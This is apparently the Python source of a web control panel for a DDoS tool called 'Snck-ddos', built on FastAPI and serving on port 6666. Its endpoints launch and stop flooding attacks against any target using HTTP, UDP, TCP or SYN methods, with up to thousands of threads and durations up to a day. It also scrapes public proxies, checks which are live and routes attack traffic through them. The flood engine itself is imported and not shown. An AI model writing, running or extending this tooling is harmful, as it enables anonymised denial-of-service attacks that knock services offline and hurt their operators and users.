# language: Python 3.11+, file: web/app.py, target: port 6666
"""Snck-ddos web control panel — FastAPI on :6666."""

from __future__ import annotations

import asyncio
from pathlib import Path
from typing import Optional

from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel, Field

from core.engine import engine, AttackConfig
from core.proxy import scrape_proxies, check_batch, load_proxies, save_proxies

ROOT = Path(__file__).resolve().parent.parent
STATIC = ROOT / "static"
TEMPLATES = Jinja2Templates(directory=str(ROOT / "web" / "templates"))

app = FastAPI(title="Snck-ddos", docs_url=None, redoc_url=None)
app.mount("/static", StaticFiles(directory=str(STATIC)), name="static")

PROXY_FILE = ROOT / "proxies.txt"
LIVE_PROXY_FILE = ROOT / "live_proxies.txt"


class StartBody(BaseModel):
    target: str = Field(..., min_length=4)
    method: str = "GET"
    threads: int = Field(200, ge=1, le=5000)
    duration: int = Field(60, ge=5, le=86400)
    payload_size: int = Field(1024, ge=64, le=65535)
    use_proxies: bool = True


@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return TEMPLATES.TemplateResponse(
        "index.html",
        {"request": request},
    )


@app.get("/api/stats")
async def stats():
    s = engine.stats
    return {
        "running": s.running,
        "method": s.method,
        "target": s.target,
        "threads": s.threads,
        "requests": s.requests,
        "bytes_sent": s.bytes_sent,
        "errors": s.errors,
        "active_workers": s.active_workers,
        "rps": round(s.rps(), 1),
        "mbps": round(s.mbps(), 2),
        "uptime": round(max(0, __import__("time").time() - s.started), 1) if s.running or s.requests else 0,
    }


@app.post("/api/start")
async def start_attack(body: StartBody, bg: BackgroundTasks):
    if engine.stats.running:
        return JSONResponse({"ok": False, "error": "attack already running"}, status_code=400)

    proxies: list[str] = []
    if body.use_proxies:
        proxies = load_proxies(LIVE_PROXY_FILE)
        if not proxies:
            proxies = load_proxies(PROXY_FILE)

    target = body.target.strip()
    if not target.startswith(("http://", "https://")) and body.method.upper() not in ("UDP", "TCP", "SYN"):
        target = "http://" + target

    cfg = AttackConfig(
        target=target,
        method=body.method.upper(),
        threads=body.threads,
        duration=body.duration,
        proxies=[f"http://{p}" for p in proxies] if proxies else [],
        payload_size=body.payload_size,
    )

    async def _run():
        await engine.start(cfg)

    bg.add_task(_run)
    return {"ok": True, "message": "attack started", "proxies": len(proxies)}


@app.post("/api/stop")
async def stop_attack():
    await engine.stop()
    return {"ok": True}


@app.post("/api/scrape")
async def api_scrape(bg: BackgroundTasks):
    async def _job():
        raw = await scrape_proxies()
        save_proxies(raw, PROXY_FILE)
        live = await check_batch(raw, concurrency=400)
        save_proxies(live, LIVE_PROXY_FILE)

    bg.add_task(_job)
    return {"ok": True, "message": "scrape + check started in background"}


@app.get("/api/proxies")
async def api_proxies():
    raw = load_proxies(PROXY_FILE)
    live = load_proxies(LIVE_PROXY_FILE)
    return {"raw": len(raw), "live": len(live)}


def run(host: str = "0.0.0.0", port: int = 6666) -> None:
    import uvicorn
    uvicorn.run(
        "web.app:app",
        host=host,
        port=port,
        log_level="info",
        workers=1,
        loop="uvloop" if __import__("sys").platform != "win32" else "asyncio",
    )


if __name__ == "__main__":
    run()
